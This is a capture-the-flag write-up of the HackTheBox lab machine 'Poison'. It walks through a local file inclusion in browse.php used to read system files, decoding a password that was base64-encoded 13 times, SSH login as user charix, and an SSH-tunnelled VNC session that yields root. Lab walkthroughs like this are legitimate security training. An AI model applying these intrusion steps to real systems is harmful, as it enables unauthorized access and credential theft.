# Poison - HackTheBox - 10.129.79.182 - poison.htb

## Enumeration

Port Scan 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

- On visiting the webpage

![Alt text](webpage.png?raw=true "Webpage")


The web app searches for any file we give as input and is not just exclusive to php file

- Thus allowing us to see other files as well, due to improper input sanitization thus leading to a generic case of LFI

- If we put any invalid input we get the reponse:

URL:
`http://10.129.79.182/browse.php?file=a.php`

```
Warning: include(a.php): failed to open stream: No such file or directory in /usr/local/www/apache24/data/browse.php on line 2

Warning: include(): Failed opening 'a.php' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2
```

- So we need to go up 5 directories for viewing `passwd` file to ensure the LFI

![Alt text](lfi.png?raw=true "LFI")

- Here the users on the machine are `root` and `charix`

## Initial access

- Since, on the webpage there are some files listed, on checking `listfiles.php`

![Alt text](listfiles.png?raw=true "listfiles")

On visitng `http://10.129.79.182/browse.php?file=pwdbackup.txt`, we get:

```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 
```

- By the looks of it, the password is encoded with base64 13 times (I guess)

- So I used a script for decoding it

```
#!/bin/bash

# Check if the number of decodes is specified
if [ -z "$1" ] || [ "$1" -lt 1 ]; then
  echo "Usage: $0 <number_of_decodes>"
  exit 1
fi

# Set the base64 encoded string
encoded_string="Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo="

# Decode the string for the specified number of times
for ((i=0; i<$1; i++))
do
  decoded_string=$(echo -n "$encoded_string" | base64 --decode)
  encoded_string=$decoded_string
done

# Output the decoded string
echo "Decoded string: $decoded_string"
```

- So the result was
```
$bash base64_decode.sh 13
Decoded string: Charix!2#4%6&8(0
```

## Shell as Charix

- Since we have the credential and we know the user on the machine, we try ssh to machine

```
$ssh charix@10.129.79.182
(charix@10.129.79.182) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

charix@Poison:~ % whoami
charix
charix@Poison:~ % cat user.txt
ea*********************9c
```

- Since the shell is not the basic `bash` shell, instead it is `csh` (aka C Shell)

- Also it is `FreeBSD` 

```
charix@Poison:~ % uname -a
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
```

- On searchploit exploit for escalation is available but the exploitation was unsuccessful

- Other methods like SUID binaries, sudo privileges and linpeas gave nothing 

- Upon seeing the active connections, it showed

- There's a file named `secret.zip`

```
charix@Poison:~ % ls
secret.zip	user.txt
```

- Unzip it and reusing Charix's password unzips it successfully 
```
$file secret
secret: Non-ISO extended-ASCII text, with no line terminators

```
- Must be of use somewhere

```
charix@Poison:~ % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0    152 10.129.79.182.22       10.10.16.21.56692      ESTABLISHED
tcp4       0      0 10.129.79.182.22       10.10.16.21.33310      ESTABLISHED
tcp4       0      0 10.129.79.182.22       10.10.16.21.50362      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN

```
Port 5901 is `vnc` service

### What is VNC

VNC stands for Virtual Network Computing. It is a graphical desktop-sharing system that allows you to remotely control another computer. It transmits the keyboard and mouse input from one computer to another, relaying the graphical-screen updates, over a network.


So we would port forward `5091` port to local machine 

`$ssh -L 5901:127.0.0.1:5901 charix@poison.htb`

- Hit and trial method led me to using `vncviewer` and using `secret` file which we extracted before as password

`$vncviewer -passwd secret 127.0.0.1:5901`

![Alt text](root.png?raw=true "root")


```
root@Poison:~ # cat root.txt
71*********************f5
```
